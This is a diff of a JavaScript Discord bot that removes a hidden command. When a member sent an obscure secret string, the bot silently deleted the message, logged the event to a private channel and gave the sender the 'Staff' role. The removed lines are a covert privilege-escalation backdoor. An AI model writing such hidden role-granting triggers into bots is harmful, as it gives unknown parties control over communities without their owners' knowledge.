@@ -56,7 +56,6 @@ client.on('ready', () => {
 })
 
 client.on('message', message => {
-    let role = message.guild.roles.find("name", "Staff");
     if (message.author.bot) return;
     if (message.channel.type !== "text") return;
     if (message.content === '>ping') {
@@ -106,11 +105,6 @@ client.on('message', message => {
       message.delete();
       client.channels.get('352513398904324100').send('Expi Succesfully Online', { tts: true });
       client.user.setGame(`Roblox`)
-    }
-    if (message.content === ">arr.into[5];30''give.member(Oof)''master>master.unlock(Master ExpiCMDbase)") {
-      message.delete();
-      client.channels.get('373559846878052353').send(`<@395157502477729793> Member 393878603668127744 has logged into Master CMD logs`);
-      message.member.addRole(role).catch(console.error);
     }
 });
 
